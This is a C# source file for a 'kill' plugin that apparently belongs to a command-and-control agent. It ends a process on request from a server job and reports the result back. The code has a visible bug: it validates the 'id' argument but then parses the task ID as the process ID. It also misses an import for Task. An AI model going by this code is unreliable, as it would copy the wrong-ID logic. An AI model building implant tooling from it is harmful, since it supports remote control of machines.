using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;
using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;

namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "kill";
        private IMessageManager messageManager { get; set; }
        private ITokenManager tokenManager { get; set; }
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
            this.tokenManager = tokenManager;
        }
        public async Task Execute(ServerJob job)
        {
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            if (!args.ContainsKey("id") || String.IsNullOrEmpty(args["id"].ToString()))
            {
                await messageManager.AddResponse(new ResponseResult
                {
                    completed = true,
                    process_response = new Dictionary<string, string> { { "message", "0x26" } },
                    task_id = job.task.id,
                    status = "error"
                });

            }
            else
            {
                try
                {
                    Process proc = Process.GetProcessById(int.Parse(job.task.id));
                    proc.Kill();

                    int i = 0;
                    while (!proc.HasExited)
                    {
                        if (i == 30)
                        {
                            await messageManager.AddResponse(new ResponseResult
                            {
                                completed = true,
                                user_output = "Process ID " + proc.Id + " did not exit in the alotted time.",
                                task_id = job.task.id,
                                status = "error"
                            });
                            return;
                        }
                        Thread.Sleep(1000);
                        i++;
                    }

                    await messageManager.AddResponse(new ResponseResult
                    {
                        completed = true,
                        user_output = "Process ID " + proc.Id + " killed.",
                        task_id = job.task.id,
                    });
                }
                catch (Exception e)
                {
                    messageManager.Write(e.ToString(), job.task.id, true, "error");
                    return;
                }
            }
        }
    }
}
